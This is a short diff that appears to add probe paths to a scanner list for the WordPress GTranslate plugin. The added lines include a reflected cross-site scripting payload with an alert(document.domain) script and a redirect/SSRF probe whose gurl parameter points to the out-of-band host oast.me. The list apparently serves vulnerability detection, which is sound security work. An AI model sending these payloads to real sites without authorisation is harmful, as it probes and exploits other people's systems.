@@ -1,1 +1,4 @@
 /wp-content/plugins/gtranslate/readme.txt
+/does_not_exist
+/?page</script><script>alert(document.domain)</script>
+/wp-content/plugins/gtranslate/url_addon/gtranslate.php?glang=en&gurl=/oast.me
